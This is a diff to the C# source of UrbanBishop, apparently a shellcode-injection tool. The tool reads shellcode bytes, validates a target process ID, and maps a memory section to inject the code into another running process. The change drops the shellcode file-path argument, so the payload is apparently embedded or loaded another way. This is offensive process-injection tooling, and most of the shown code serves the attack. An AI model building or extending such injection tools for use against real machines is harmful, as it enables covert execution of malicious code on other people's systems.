@@ -6,15 +6,18 @@ namespace UrbanBishop
 {
     class Program
     {
-        public static void CastleKingside(String Path, BerlinDefence.PROC_VALIDATION Pv, Int32 ProcId, Boolean Clean)
+        public static void CastleKingside(BerlinDefence.PROC_VALIDATION Pv, Int32 ProcId, Boolean Clean)
         {
             // Read in sc bytes
-            BerlinDefence.SC_DATA scd = BerlinDefence.ReadShellcode(Path);
+           
+            BerlinDefence.SC_DATA scd = BerlinDefence.ReadShellcode();
             if (scd.iSize == 0)
             {
                 Console.WriteLine("[!] Unable to read shellcode bytes..");
                 return;
             }
+       
+
 
             // Create local section & map view of that section as RW in our process
             Console.WriteLine("\n[>] Creating local section..");
@@ -117,10 +120,10 @@ namespace UrbanBishop
                 BerlinDefence.GetHelp();
             } else
             {
-                int iPathScBin = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(p|Path)$").Match(s).Success);
+                //int iPathScBin = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(p|Path)$").Match(s).Success);
                 int iPID = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(i|Inject)$").Match(s).Success);
                 int bClean = Array.FindIndex(args, s => new Regex(@"(?i)(-|--|/)(c|Clean)$").Match(s).Success);
-                if (iPathScBin != -1 && iPID != -1)
+                if (iPID != -1)
                 {
                     Boolean Clean = false;
                     if (bClean != -1)
@@ -130,12 +133,12 @@ namespace UrbanBishop
 
                     try
                     {
-                        String sPathScBin = args[(iPathScBin + 1)];
+                        //String sPathScBin = args[(iPathScBin + 1)];
                         Int32 Proc = int.Parse(args[(iPID + 1)]);
-                        Boolean bFilePath = BerlinDefence.PathIsFile(sPathScBin);
+                        //Boolean bFilePath = BerlinDefence.PathIsFile(sPathScBin);
                         BerlinDefence.PROC_VALIDATION pv = BerlinDefence.ValidateProc(Proc);
 
-                        if (!bFilePath || !pv.isvalid || pv.hProc == IntPtr.Zero)
+                        if ( !pv.isvalid || pv.hProc == IntPtr.Zero)
                         {
                             if (!pv.isvalid)
                             {
@@ -151,7 +154,7 @@ namespace UrbanBishop
                             Console.WriteLine("| Process    : " + pv.sName);
                             Console.WriteLine("| Handle     : " + pv.hProc);
                             Console.WriteLine("| Is x32     : " + pv.isWow64);
-                            Console.WriteLine("| Sc binpath : " + sPathScBin);
+                            //Console.WriteLine("| Sc binpath : " + sPathScBin);
                             Console.WriteLine("|--------");
 
                             if (pv.isWow64)
@@ -160,7 +163,7 @@ namespace UrbanBishop
                                 return;
                             }
 
-                            CastleKingside(sPathScBin, pv, Proc, Clean);
+                            CastleKingside(pv, Proc, Clean);
                         }
 
                     } catch
